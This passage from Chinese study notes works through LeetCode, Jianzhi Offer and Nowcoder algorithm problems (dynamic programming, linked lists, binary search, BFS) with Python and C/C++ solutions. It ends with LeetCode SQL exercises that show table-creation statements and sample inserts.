self.findNode(rootA.left, rootB) or self.findNode(rootA.right, rootB)\n        else:\n            return  self.judge(rootA.left,rootB.left) and self.judge(rootA.right,rootB.right)\n\n\t#注意开始的头节点\n    def isSubStructure(self, A: TreeNode, B: TreeNode) -> bool:\n        if(A == None or B == None):\n            return False\n        if(A.val == B.val):\n            if(self.judge(A,B) == False):\n                A.val = B.val + 1\n            else:\n                return True\n        return self.findNode(A, B)\n```\n\n## 圆圈中最后剩下的数字\n\n![image-20221018214142551](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221018214142551.png)\n\n约瑟夫环问题，详情参考如下\n\n[换个角度举例解决约瑟夫环 - 圆圈中最后剩下的数字 - 力扣（LeetCode）](https://leetcode.cn/problems/yuan-quan-zhong-zui-hou-sheng-xia-de-shu-zi-lcof/solution/huan-ge-jiao-du-ju-li-jie-jue-yue-se-fu-huan-by-as/)\n\n[剑指 Offer 62. 圆圈中最后剩下的数字（数学 / 动态规划，清晰图解） - 圆圈中最后剩下的数字 - 力扣（LeetCode）](https://leetcode.cn/problems/yuan-quan-zhong-zui-hou-sheng-xia-de-shu-zi-lcof/solution/jian-zhi-offer-62-yuan-quan-zhong-zui-ho-dcow/)\n\n对于`f(n,m)`问题，固定m，对n做规律，得到状态转换方程\n\n``` \ndp[n] = (dp[n-1] + m) % n\ndp[1] = 0\n```\n\n由此可得代码\n\n```python\nclass Solution:\n    def lastRemaining(self, n: int, m: int) -> int:\n        dp = [0] * (n+1)\n        for i in range(2,n+1):\n            dp[i] = (dp[i-1] + m) % i\n        return dp[n]\n```\n\n## 青蛙跳台阶问题\n\n即类似之前的合并问题，**把数字翻译成字符串**\n\n![image-20221018215836305](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221018215836305.png)\n\n即推导一下，设每个台阶为1，每两个1台阶相邻可以选择合并为一个2台阶，那么假定如下台阶\n\n```\n11111 选择合并之后总数为dp(5)\n```\n\n此时如果加入一级台阶，有两种情况\n\n- 与前一个台阶合并：`1111 2`\n- 不合并：`11111 1`\n\n即`dp(6) = dp(4) + dp(5)`，由此可得动态规划\n\n```\ndp(0) = 1\ndp(1) = 1\ndp(2) = dp(0) + dp(1) = 2\ndp(n) = dp(n-1) + dp(n-2)\n```\n\n依据动态规划得到解\n\n```python\nclass Solution:\n    def numWays(self, n: int) -> int:\n        if(n == 0 or n == 1):\n            return 1\n        dp = [0] * (n+1)\n        dp[0] = 1\n        dp[1] = 1\n        for i in range(2,n+1):\n            dp[i] = dp[i-1] + dp[i-2]\n        return dp[n] % 1000000007\n```\n\n## 剪绳子\n\n![image-20221019112511996](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221019112511996.png)\n\n可用动态规划，dp[n]为将长度为n的绳子拆分为至少两截之后的乘积。假定将绳子拆分为`j`和剩下的`n-j`，那么如下\n\n- 将`n`拆分成j和`n-j`的和，且`n-j`不再拆分成多个正整数，此时的乘积是`dp[n] = j * (n-j)`\n\n- 将`n`拆分成j和`n-j`的和，且`n-j`可以拆分成多个正整数，此时的乘积是`dp[n] = j * dp[n-j]`\n\n综上可得如下结果\n\n```\ndp[n] = j * max(n-j,dp[n-j])\n```\n\n然后定义初始状态\n\n```\ndp[0] = 0\ndp[1] = 0\ndp[2] = 1\n```\n\n可得最终代码\n\n```python\nclass Solution:\n    def cuttingRope(self, n: int) -> int:\n        dp = [0] * (n+1)\n        dp[0] = 0\n        dp[1] = 0\n        dp[2] = 1\n        if(n == 0 or n == 1 or n == 2):\n            return dp[n]\n        for i in range(3,n+1):\n            for j in range(1,i):\n                dp[i] = max(dp[i],j*(i-j),j*dp[i-j])\n        return dp[n]\n```\n\n需要注意的是，遍历j的过程中，由于`dp[i]`会被重复计算，所以需要把`dp[i]`也加入进行判断，防止最大值被覆盖。\n\n\n\n## 包含min函数的栈\n\n![image-20221019151036307](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221019151036307.png)\n\n定义辅助栈，存放非严格递减元素，参考\n\n[面试题30. 包含 min 函数的栈（辅助栈，清晰图解） - 包含min函数的栈 - 力扣（LeetCode）](https://leetcode.cn/problems/bao-han-minhan-shu-de-zhan-lcof/solution/mian-shi-ti-30-bao-han-minhan-shu-de-zhan-fu-zhu-z/)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/img/f31f4b7f5e91d46ea610b6685c593e12bf798a9b8336b0560b6b520956dd5272-Picture1.png)\n\n然后在`pop`和`push`函数中进行一下判断即可\n\n```python\nclass MinStack:\n    def __init__(self):\n        self.stackA, self.stackB = [], []\n\n\n    def push(self, x: int) -> None:\n        self.stackA.append(x)\n        if(len(self.stackB) == 0 or self.stackB[-1] >= x):\n            self.stackB.append(x)\n\n    def pop(self) -> None:\n        tmp = self.stackA.pop()\n        if(tmp == self.stackB[-1]):\n            self.stackB.pop()\n\n\n    def top(self) -> int:\n        return self.stackA[-1]\n\n\n    def min(self) -> int:\n        return self.stackB[-1]\n\n```\n\n\n\n## 调整数组顺序使奇数位于偶数前面\n\n![image-20221019152724383](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221019152724383.png)\n\n双指针或直接新数组\n\n- 新数组\n\n```python\nclass Solution:\n    def exchange(self, nums: List[int]) -> List[int]:\n        newJiNums = []\n        newOuNums = []\n        for i in nums:\n            if(i % 2 == 1):\n                newJiNums.append(i)\n            else:\n                newOuNums.append(i)\n        return newJiNums + newOuNums\n\n```\n\n- 双指针\n\n```python\nclass Solution:\n    def exchange(self, nums: List[int]) -> List[int]:\n        i = 0\n        j = len(nums) - 1\n        while(i < j):\n            while(i < j and nums[i] % 2 == 1):\n                i += 1\n            while(i < j and nums[j] % 2 == 0):\n                j -= 1\n            nums[i],nums[j] = nums[j],nums[i]\n        return nums\n```\n\n\n\n## 丑数\n\n![image-20221020143110808](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221020143110808.png)\n\n刚开始想着行不行保存状态，a,b,c保存状态，初始化为0，然后每次将这三个数尝试递增之后，计算`tmp = min((a+1)*2,(b+1)*3,(c+1)*5)`，然后取最小值，之后再判断是哪一个，将对应的`a/b/c`加一即可。\n\n然后由于`a+1/b+1/c+1`可能会出现包含除2,3,5之外的质因子，所以需要进行判断，判断其最大的质因子是否大于5即可，如果大于5，则不能要这个数。\n\n```python\nclass Solution:\n    def get_num_factors(self,num):\n        hashSet = set()\n        tmp = 2\n        if(num < tmp):\n            return []\n        while (num >= tmp):\n            k = num % tmp\n            if (k == 0):\n                hashSet.add(tmp)\n                num = num / tmp  # 更新\n            else:\n                tmp = tmp + 1  # 同时更新除数值，不必每次都从头开始\n        hashList = list(hashSet)\n        return hashList\n\n\n    def nthUglyNumber(self, n: int) -> int:\n        a,b,c = 0,0,0\n        tmp = [2,3,5]\n        dp = [1] * (n+1)\n        i = 2\n        while(i < n+1):\n            flag = 0\n            tmp = min((a+1)*2,(b+1)*3,(c+1)*5)\n            if(tmp == (a+1)*2):\n                tmpList = self.get_num_factors(a+1)\n                tmpList.sort()\n                if(len(tmpList) > 0 and tmpList[-1] > 5):\n                    a += 1\n                else:\n                    if(not flag):\n                        i += 1\n                        flag = 1\n                    a += 1\n\n            if(tmp == (b+1)*3):\n                tmpList = self.get_num_factors(b+1)\n                tmpList.sort()\n                if(len(tmpList) > 0 and tmpList[-1] > 5):\n                    b += 1\n                else:\n                    if(not flag):\n                        i += 1\n                        flag = 1\n                    b += 1\n            if(tmp == (c+1)*5):\n                tmpList = self.get_num_factors(c+1)\n                tmpList.sort()\n                if(len(tmpList) > 0 and tmpList[-1] > 5):\n                    c += 1\n                else:\n                    if(not flag):\n                        i += 1\n                        flag = 1\n                    c += 1\n            if(flag):\n                dp[i-1] = tmp\n        return dp[n]\n```\n\n时间复杂度为`O(n^2)`，会超时，后面看题解用动态规划才行，参考\n\n[剑指 Offer 49. 丑数（动态规划，清晰图解） - 丑数 - 力扣（LeetCode）](https://leetcode.cn/problems/chou-shu-lcof/solution/mian-shi-ti-49-chou-shu-dong-tai-gui-hua-qing-xi-t/)\n\n需要明确一点就是，所有的丑数都是前面的某个丑数乘以某个数得到的，这个某个数也必定是某个丑数，不然就会存在非1,2,3,5的质因子了。\n\n```python\nclass Solution:\n    def nthUglyNumber(self, n: int) -> int:\n        state = [0,0,0]\n        dp = [1] * (n + 1)\n        for i in range(2,n+1):\n            dp[i] = min(dp[state[0]+1]*2,dp[state[1]+1]*3,dp[state[2]+1]*5)\n            if(dp[i] == dp[state[0]+1]*2):\n                state[0] += 1\n            if(dp[i] == dp[state[1]+1]*3):\n                state[1] += 1\n            if(dp[i] == dp[state[2]+1]*5):\n                state[2] += 1\n        return dp[n]\n```\n\n## 股票的最大利润\n\n和之前的**买卖股票最佳时机**一样\n\n```\nclass Solution:\n    def maxProfit(self, prices: List[int]) -> int:\n        minIdx = 0\n        maxBenefit = 0\n        for i in range(0,len(prices)):\n            if(prices[i] < prices[minIdx]):\n                minIdx = i\n            maxBenefit = max(maxBenefit,prices[i] - prices[minIdx])\n        return maxBenefit\n```\n\n不过这次分析一下动态规划，参考[面试题63. 股票的最大利润（动态规划，清晰图解） - 股票的最大利润 - 力扣（LeetCode）](https://leetcode.cn/problems/gu-piao-de-zui-da-li-run-lcof/solution/mian-shi-ti-63-gu-piao-de-zui-da-li-run-dong-tai-2/)\n\n假定`dp[i]`代表以`prices[i]`为结尾的子数组的最大利润，则可推导得到动态转换方程\n\n```\n前i日最大利润=max(前(i−1)日最大利润,第i日价格−前i日最低价格)\ndp[i] = max(dp[i-1],prices[i]-min(prices[0:i]))\n```\n\n依据动态转换方程求得最终代码\n\n```python\nclass Solution:\n    def maxProfit(self, prices: List[int]) -> int:\n        if(len(prices) == 0):\n            return 0\n        minIdx = 0\n        dp = [0] * len(prices)\n        dp[0] = 0\n        for i in range(1,len(prices)):\n            if(prices[i] < prices[minIdx]):\n                minIdx = i\n            dp[i] = max(dp[i-1],prices[i] - prices[minIdx])\n        return dp[len(prices)-1]\n```\n\n\n\n## 最长不含重复字符的子字符串\n\n参考之前的**无重复字符的最长子串**，使用**滑动窗口+哈希**\n\n```python\nclass Solution:\n    def lengthOfLongestSubstring(self, s: str) -> int:\n        if(len(s) == 0):\n            return 1\n        i,j=0,0\n        tmpS = \"\"\n        maxLen = 0\n        while(j < len(s)):\n            if(s[j] in tmpS):\n                i += 1\n            j += 1\n            tmpS = s[i:j]\n            while(len(set(tmpS)) != len(tmpS)):\n                i += 1\n                tmpS = s[i:j]\n            maxLen = max(maxLen,j-i)\n```\n\n或者使用**动态规划+哈希**\n\n假定`dp[i]`为以`s[0:i]`这个子字符串的无重复字符的最长字串长度，当加入一个字符，即对于`dp[i+1]`而言，如果加入的字符`s[i+1]`可以和前面`s[i-dp[i-1]:i]`组成无重复的子字符串，那么`dp[i+1] = dp[i] + 1`，否则`dp[i+1] = dp[i]`\n\n```\n判断加入字符是否可以和前面dp[i-1]个字符串组成无重复子串,推导得到下面的状态转换方程\ndp[i] = dp[i-1]\n      = dp[i-1] + 1\n```\n\n初始状态：`dp[0] = 1`\n\n依据状态转换方程可得代码\n\n```python\nclass Solution:\n    def lengthOfLongestSubstring(self, s: str) -> int:\n        if(len(s) == 0):\n            return 0\n        if(len(s) == 1):\n            return 1\n        dp = [0] * (len(s))\n        dp[0] = 1\n        for i in range(1,len(s)):\n            tmpS = s[i-dp[i-1]:i+1]\n            if(len(set(tmpS)) == len(tmpS)):\n                dp[i] = dp[i-1] + 1\n            else:\n                dp[i] = dp[i-1]\n        return dp[len(s)-1]\n```\n\n## 构建乘积数组\n\n![image-20221021114545583](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221021114545583.png)\n\n利用两次遍历依次累乘\n\n对于`B[i]`：\n\n- 第一次遍历，计算从`B[0]~B[i-1]`的乘积，结果保存在`B[i]`中\n\n  这时候由于`B[i] = B[i-1]*A[i-1]`，所以我们可以从B[0]依次累乘，只需要遍历一次即可。\n\n- 第二次遍历，计算从`B[n-1]~B[i+1]`的乘积，最后乘上之前保存的`B[i]`即可\n\n  同样这时候由于`B[i] = B[i+1]*A[i+1]*B[i]`，那么我们也可以从`B[n-1]`开始依次累乘，遍历一次即可。\n\n依据该规律，两次遍历即可得出结果\n\n```python\nclass Solution:\n    def constructArr(self, a: List[int]) -> List[int]:\n        product = 1\n        b = [1] * len(a)\n        for i in range(0,len(a)):\n            if(i == 0):\n                product = 1\n            else:\n                product *= a[i-1]\n            b[i] = product\n        product = 1\n        for i in range(len(a)-1,-1,-1):\n            if(i == len(a) - 1):\n                product = 1\n            else:\n                product *= a[i+1]\n            b[i] *= product\n        return b\n```\n\n\n\n## 数组中数字出现的次数\n\n![image-20221021154510005](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221021154510005.png)\n\n如果不考虑空间复杂度，直接使用hash即可\n\n```\nclass Solution:\n    def singleNumbers(self, nums: List[int]) -> List[int]:\n        dict = {}\n        myList = []\n        for i in nums:\n            if(i in dict.keys()):\n                dict[i] = not dict[i]\n            else:\n                dict[i] = True\n        for i in dict.keys():\n            if(dict[i] == True):\n                myList.append(i)\n        return myList\n        \n```\n\n但是要求空间复杂度为O(1)，那么就需要进行其他方法了，参考\n\n[剑指 Offer 56 - I. 数组中数字出现的次数（位运算，清晰图解） - 数组中数字出现的次数 - 力扣（LeetCode）](https://leetcode.cn/problems/shu-zu-zhong-shu-zi-chu-xian-de-ci-shu-lcof/solution/jian-zhi-offer-56-i-shu-zu-zhong-shu-zi-tykom/)\n\n提供的思路，位运算\n\n- 假设不同的两位数分别为`x,y`\n- 通过异或`nums`里所有数，求得`x⊕y`为`xy`\n- 假定`m=1`，通过位运算逐次循环左移并且异或`x⊕y`，求得`x⊕y`中最小为1的位。\n- 由于`x⊕y`中某位`bit`为`1`，那么由于异或的特性，`x、y`各自该位的`bit`一定一个为`1`一个为`0`，基于此对`nums`进行分组\n- 将该位`bit`为`1`的分为一组，为`0`的分为另一组，那么即可将`x、y`分开。同时对于其他的数字，由于各自独立成对，那么成对的数字一定会被分到同一组，之后异或之后也直接为0了。\n- 然后各自两种进行异或即可得到最终的`x、y`\n\n```python\nclass Solution:\n    def singleNumbers(self, nums: List[int]) -> List[int]:\n        xy = 0\n        for i in nums:\n            xy ^= i\n        m = 1\n        while (m & xy == 0):\n            m <<= 1\n        x,y = 0,0\n        for i in nums:\n            if(i & m == 0):\n                x ^= i\n            else:\n                y ^= i\n        return [x,y]\n```\n\n\n\n## 礼物的最大价值\n\n![image-20221021162958198](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221021162958198.png)\n\n动态规划，设`dp[i][j]`为以`[i,j]`为终点的途径的获得的最大价值礼物，则有状态转换方程如下\n\n```\ndp[i][j] = max(dp[i-1][j],dp[i][j-1]) + grid[i][j]\n```\n\n初始状态：`dp[0][0] = grid[0][0]`\n\n同时由于可能会超出边界，所以将`dp`扩大一个长宽\n\n```\ndp = [[0 for i in range(len(grid[0]) + 1)] for i in range(len(grid) + 1)]\n```\n\n同时从`dp[1][1]`开始作为计数，边界为数值为0，依据状态转换方程可得\n\n```python\nclass Solution:\n    def maxValue(self, grid: List[List[int]]) -> int:\n        dp = [[0 for i in range(len(grid[0]) + 1)] for i in range(len(grid) + 1)]\n        dp[1][1] = grid[0][0]\n        for i in range(1, len(grid) + 1):\n            for j in range(1, len(grid[0]) + 1):\n                dp[i][j] = max(dp[i-1][j],dp[i][j-1]) + grid[i - 1][j - 1]\n        return dp[len(grid)][len(grid[0])]\n```\n\n\n\n## 数组中出现次数超过一半的数字\n\n![image-20221021170623491](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221021170623491.png)\n\n第一个想法就是`hash`表\n\n```python\nclass Solution:\n    def majorityElement(self, nums: List[int]) -> int:\n        if(len(nums) == 1):\n            return nums[0]\n        dict = {}\n        for i in nums:\n            if(i in dict.keys()):\n                dict[i] = dict[i] + 1\n            else:\n                dict[i] = 1\n        for i in dict:\n            if(dict[i] > len(nums)//2):\n                return i\n```\n\n第二个想法就是排序，然后取中位数即为超过数组一半的数\n\n第三个参考摩尔投票法：\n\n[剑指 Offer 39. 数组中出现次数超过一半的数字（摩尔投票法，清晰图解） - 数组中出现次数超过一半的数字 - 力扣（LeetCode）](https://leetcode.cn/problems/shu-zu-zhong-chu-xian-ci-shu-chao-guo-yi-ban-de-shu-zi-lcof/solution/mian-shi-ti-39-shu-zu-zhong-chu-xian-ci-shu-chao-3/)\n\n```python\nclass Solution:\n    def majorityElement(self, nums: List[int]) -> int:\n        sum = 0\n        for i in nums:\n            if(sum == 0):\n                x = i\n            if(i != x):\n                sum -= 1\n            else:\n                sum += 1\n        return x\n```\n\n## 和为s的连续正数序列\n\n![image-20221021211704786](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221021211704786.png)\n\n和求最长不重复子串一样，直接滑动窗口\n\n```python\nclass Solution:\n    def findContinuousSequence(self, target: int) -> List[List[int]]:\n        i,j = 0,0\n        myList = [i for i in range(1,ceil(target/2)+1)]\n        res = []\n        sum = 0\n        sum += myList[i]\n        while(j < len(myList)):\n            if(sum < target):\n                if(j == len(myList)-1):\n                    return res\n                else:\n                    j += 1\n                    sum += myList[j]\n            elif(sum == target):\n                res.append(myList[i:j+1])\n                if(j == len(myList)-1):\n                    return res\n                else:\n                    j += 1\n                    sum += myList[j]\n            else:\n                sum -= myList[i]\n                i += 1\n        return res\n```\n\n\n\n## 从上到下打印二叉树\n\n![image-20221024113552404](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221024113552404.png)\n\n可知BFS广度优先搜索满足要求，使用队列\n\n```python\nimport queue\nclass Solution:\n    def levelOrder(self, root: TreeNode) -> List[int]:\n        res = []\n        q = queue.Queue()\n\n        def bfs():\n            if(q.qsize() == 0):\n                return\n            root = q.get()\n            if (root == None):\n                return\n            res.append(root.val)\n            if(root.left != None):\n                q.put(root.left)\n            if(root.right != None):\n                q.put(root.right)\n            bfs()\n        q.put(root)\n        bfs()\n        return res\n```\n\n去掉这个递归有点麻烦，多次判断，尝试去掉递归\n\n```python\nimport queue\nclass Solution:\n    def levelOrder(self, root: TreeNode) -> List[int]:\n        res = []\n        q = queue.Queue()\n\n        def bfs():\n            while(q.qsize() != 0):\n                tmpRoot = q.get()\n                res.append(tmpRoot.val)\n                if(tmpRoot.left != None):\n                    q.put(tmpRoot.left)\n                if(tmpRoot.right != None):\n                    q.put(tmpRoot.right)\n        if(root == None):\n            return res\n        q.put(root)\n        bfs()\n        return res\n```\n\n\n\n# 牛客TOP101\n\n## 链表\n\n### 链表内指定区间反转\n\n![image-20221104201440818](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221104201440818.png)\n\n使用`pre`、`cur`、`next`三指针进行，需要注意某些特殊条件\n\n```c\nstruct ListNode* reverseBetween(struct ListNode* head, int m, int n ) {\n    struct ListNode* originHead = head;\n    struct ListNode* pre = head;\n    struct ListNode* cur = head;\n    struct ListNode* tmpHead = head;\n    struct ListNode* lengtHead = head;\n    if ((n-m) < 1 || head==NULL||head->next==NULL) {\n        return originHead;\n    }\n    if (m == 1) {\n        tmpHead = NULL;\n    }\n    for (int i = 0 ; i < m - 1 ; i ++ ) {\n        cur = cur->next;\n    }\n    for (int i = 0 ; i < n ; i ++ ) {\n        pre = pre->next;\n    }\n    struct ListNode* next;\n    for (int i = 0 ; i < n - m + 1 ; i ++) {\n        next = cur->next;\n        cur->next = pre;\n        pre = cur;\n        cur = next;\n    }\n    if (tmpHead == NULL) {\n        return pre;\n    } else {\n        for (int i = 0 ; i < m - 2 ; i ++ ) {\n            tmpHead = tmpHead->next;\n        }\n        tmpHead->next = pre;\n        return originHead;\n    }\n}\n```\n\n### 链表中的节点每k个一组翻转\n\n![image-20221105090729643](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221105090729643.png)\n\n即依照索引，滑动窗口形式进行指定区间翻转，这里要记录一下翻转之前的`preHead`指针，方便在翻转之后进行连接。\n\n```sql\nstruct ListNode* reverseKGroup(struct ListNode* head, int k ) {\n    if (k == 1) {\n        return head;\n    }\n    struct ListNode* originHead = head;\n    struct ListNode* lengtHead = head;\n    struct ListNode* pre = head;\n    struct ListNode* cur = head;\n    struct ListNode* preHead;\n    struct ListNode* nextPreHead = NULL;\n    int tmpCount;\n    int left = 1;\n    int right = left + k - 1 ;\n    int length = 0;\n    while (lengtHead != NULL) {\n        lengtHead = lengtHead->next;\n        length += 1;\n    }\n    while (right <= length) {\n        tmpCount = 0;\n        while (tmpCount < k) {\n            pre = pre->next;\n            tmpCount += 1;\n        }\n        struct ListNode* next;\n        for (int j = 0 ; j < k; j ++) {\n            if (j == 0) {\n                preHead = nextPreHead;\n                nextPreHead = cur;\n            }\n            next = cur->next;\n            cur->next = pre;\n            pre = cur;\n            cur = next;\n        }\n        if (left == 1) {\n            originHead = pre;\n        }\n        if (preHead != NULL) {\n            preHead->next = pre;\n        }\n        pre = cur;\n        left += k;\n        right += k;\n    }\n    return originHead;\n}\n```\n\n\n\n### 链表中环的入口结点\n\n![image-20221107203805285](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221107203805285.png)\n\n快慢指针，参考：[链表中环的入口结点_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/253d2c59ec3e4bc68da16833f79a38e4?tpId=295&tqId=23449&ru=/exam/oj&qru=/ta/format-top101/question-ranking&sourceUrl=%2Fexam%2Foj)\n\n- 快指针走两步，慢指针走一步，直至相遇\n- 从相遇点和链表头部再出发，直至相遇，相遇点即为环入口点。\n\n```C++\nclass Solution {\npublic:\n    ListNode* EntryNodeOfLoop(ListNode* head) {\n        struct ListNode* fast = head;\n        struct ListNode* low = head;\n        struct ListNode* originHead = head;\n        while(fast&&fast->next){\n            fast = fast->next->next;\n            low = low->next;\n            if(fast==low)\n                break;\n        }\n        if(fast == NULL or fast->next == NULL){\n            return NULL;\n        }\n        while (originHead != fast){\n            originHead = originHead->next;\n            fast = fast->next;\n        }\n        return originHead;\n    }\n};\n```\n\n\n\n### 删除链表的倒数第n个节点\n\n![image-20221108164412584](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221108164412584.png)\n\n快慢指针，记得记录`pre`节点\n\n```C++\nclass Solution {\npublic:\n    /**\n     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可\n     *\n     *\n     * @param pHead ListNode类\n     * @param k int整型\n     * @return ListNode类\n     */\n    ListNode* removeNthFromEnd(ListNode* pHead, int k) {\n        // write code here\n        struct ListNode* fast = pHead;\n        struct ListNode* pre = NULL;\n        struct ListNode* slow = pHead;\n        int tmp = 0;\n        while (fast != NULL && tmp != k){\n            fast = fast->next;\n            tmp += 1;\n        }\n        if(tmp != k){\n            return NULL;\n        }\n        while (fast != NULL){\n            fast = fast->next;\n            if(pre == NULL){\n                pre = slow;\n            } else{\n                pre = pre->next;\n            }\n            slow = slow->next;\n        }\n        if(pre == NULL){\n            return pHead->next;\n        } else{\n            pre->next = slow->next;\n        }\n        return pHead;\n    }\n};\n```\n\n\n\n### 两个链表的第一个公共结点\n\n![image-20221108164039213](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221108164039213.png)\n\n计算长度，参考：[两个链表的第一个公共结点_牛客题霸_牛客网 (nowcoder.com)](https://www.nowcoder.com/practice/6ab1d9a29e88450685099d45c9e31e46?tpId=295&tqId=23257&ru=/exam/oj&qru=/ta/format-top101/question-ranking&sourceUrl=%2Fexam%2Foj%3FfromPut%3Dad_baidu_sem_wushuang_bianchengtuoci0810_zaixianbiancheng%26bd_vid%3D12203772359314211200)\n\n![36](https://pig-007.oss-cn-beijing.aliyuncs.com/img/36.gif)\n\n```C++\nclass Solution {\npublic:\n    ListNode* FindFirstCommonNode( ListNode* pHead1, ListNode* pHead2) {\n        struct ListNode* originHead1 = pHead1;\n        struct ListNode* originHead2 = pHead2;\n        while(pHead1 != pHead2){\n            if(pHead1 == NULL){\n                pHead1 = originHead2;\n            }else{\n\t\t\t\tpHead1 = pHead1->next;\n\t\t\t}\n            if(pHead2  == NULL){\n                pHead2 = originHead1;\n            }else{\n\t\t\t\tpHead2 = pHead2->next;\n\t\t\t}\n        }\n        return pHead1;\n    }\n};\n```\n\n\n\n### 链表的奇偶重排\n\n![image-20221108163852157](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221108163852157.png)\n\n分别简历奇偶链表然后串在一起，注意边界问题\n\n```C++\nclass Solution {\npublic:\n    /**\n     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可\n     *\n     *\n     * @param head ListNode类\n     * @return ListNode类\n     */\n    ListNode* oddEvenList(ListNode* head) {\n        if(head == NULL || head->next == NULL){\n            return head;\n        }\n        ListNode* oddHead = head;\n        ListNode* evenHead = head->next;\n        ListNode* originOddHead = head;\n        ListNode* originEvenHead = evenHead;\n        while(oddHead->next != NULL && evenHead->next != NULL){\n            oddHead->next = oddHead->next->next;\n            oddHead = oddHead->next;\n            evenHead->next = evenHead->next->next;\n            evenHead = evenHead->next;\n        }\n        oddHead->next = originEvenHead;\n        return originOddHead;\n    }\n};\n```\n\n\n\n### 删除有序链表中重复的元素-II\n\n![image-20221109162359368](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221109162359368.png)\n\n- 预先确定一个头节点`preHead`以及`pre`和`cur`节点，逐次遍历\n\n  ```c++\n  preHead = preHead->next;\n  cur = cur->next;\n  pre = pre->next;\n  ```\n\n- 然后挨个删除重复节点\n\n  ```\n  if( cur->val == pre->val){\n      tmp = cur->val;\n      preHead->next = pre->next;\n      pre = pre->next;\n      cur = cur->next;\n  }\n  ```\n\n- 当碰到不同节点时，判断`pre`节点是否和存储的重复节点值相等，如果相当，那么`pre`节点也需要删除\n\n  ```c++\n  if(pre->val == tmp){\n      preHead->next = cur;\n  }\n  ```\n\n需要最后`cur`为NULL时，如果最后一个也需要删除，那么此时由于`cur`为NULL，所以无法进入`while`循环中，无法删除，需要在`while`循环外部进行判断\n\n```c++\nif(pre->val == tmp){\n    preHead->next = NULL;\n}\n```\n\n最终结果\n\n```c++\nclass Solution {\npublic:\n    /**\n     *\n     * @param head ListNode类\n     * @return ListNode类\n     */\n    ListNode* deleteDuplicates(ListNode* head) {\n        if(head == NULL || head->next == NULL){\n            return head;\n        }\n        struct ListNode* preHead = (struct ListNode*) malloc(0x10);\n        struct ListNode* originPreHead = preHead;\n        preHead->next = head;\n        struct ListNode* pre = head;\n        struct ListNode* cur = head->next;\n        int tmp;\n        while (cur != NULL){\n            if( cur->val == pre->val){\n                tmp = cur->val;\n                preHead->next = pre->next;\n                pre = pre->next;\n                cur = cur->next;\n            }else{\n                if(pre->val == tmp){\n                    preHead->next = cur;\n                } else{\n                    preHead = preHead->next;\n                }\n                cur = cur->next;\n                pre = pre->next;\n            }\n        }\n        if(pre->val == tmp){\n            preHead->next = NULL;\n        }\n        return originPreHead->next;\n    }\n};\n```\n\n## 查找与排序\n\n### 二分查找\n\n注意边界性问题\n\n```c++\nint search(int* nums, int numsLen, int target ) {\n    int l = 0;\n    int r = numsLen - 1;\n    int mid = (l + r)/2;\n    while(r >= l){\n        if(nums[mid] == target){\n            return mid;\n        }\n        if(nums[mid] < target){\n            l = mid + 1;\n            mid = (mid+1 + r) / 2;\n        } else{\n            r = mid - 1;\n            mid = (l + mid-1) / 2;\n        }\n    }\n    return -1;\n}\n```\n\n### 寻找峰值\n\n![image-20221109192943739](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221109192943739.png)\n\n采用二分查找，依据`mid`来更改`right`和`left`缩小范围，直至找到峰值\n\n```c++\nclass Solution {\npublic:\n    /**\n     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可\n     *\n     *\n     * @param nums int整型vector\n     * @return int整型\n     */\n    int findPeakElement(vector<int>& nums) {\n        int l = 0;\n        int r = nums.size() - 1;\n\n        while(l < r){\n            int mid = (l + r)/2;\n            if(nums[mid] > nums[mid+1]){\n                r = mid;\n            } else{\n                l = mid + 1;\n            }\n        }\n        return l;\n\n        // write code here\n    }\n};\n```\n\n\n\n# 数据库\n\n例题均来源于`Leetcode`\n\n## 游戏玩法分析I\n\n创建语句\n\n```sql\nCreate table If Not Exists Activity (player_id int, device_id int, event_date date, games_played int);\nTruncate table Activity;\ninsert into Activity (player_id, device_id, event_date, games_played) values ('1', '2', '2016-03-01', '5');\ninsert into Activity (player_id, device_id, event_date, games_played) values ('1', '2', '2016-05-02', '6');\ninsert into Activity (player_id, device_id, event_date, games_played) values ('2', '3', '2017-06-25', '1');\ninsert into Activity (player_id, device_id, event_date, games_played) values ('3', '1', '2016-03-02', '0');\ninsert into Activity (player_id, device_id, event_date, games_played) values ('3', '4', '2018-07-03', '5');\n```\n\n![image-20221103160948765](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221103160948765.png)\n\n### 知识点：\n\n#### group聚合\n\n基于`group by`之后的列字段进行相同值的聚合，当查询多个列时，通常需要进行排序，所以也需要对相关数据进行值判定\n\n### 代码：\n\n```sql\nSELECT \n    player_id,\n    min(event_date) first_login\nFROM Activity\nGROUP BY player_id\n```\n\n## 寻找用户推荐人\n\n创建语句：\n\n```sql\nCreate table If Not Exists Customer (id int, name varchar(25), referee_id int);\nTruncate table Customer;\ninsert into Customer (id, name, referee_id) values ('1', 'Will', 'None');\ninsert into Customer (id, name, referee_id) values ('2', 'Jane', 'None');\ninsert into Customer (id, name, referee_id) values ('3', 'Alex', '2');\ninsert into Customer (id, name, referee_id) values ('4', 'Bill', 'None');\ninsert into Customer (id, name, referee_id) values ('5', 'Zack', '1');\ninsert into Customer (id, name, referee_id) values ('6', 'Mark', 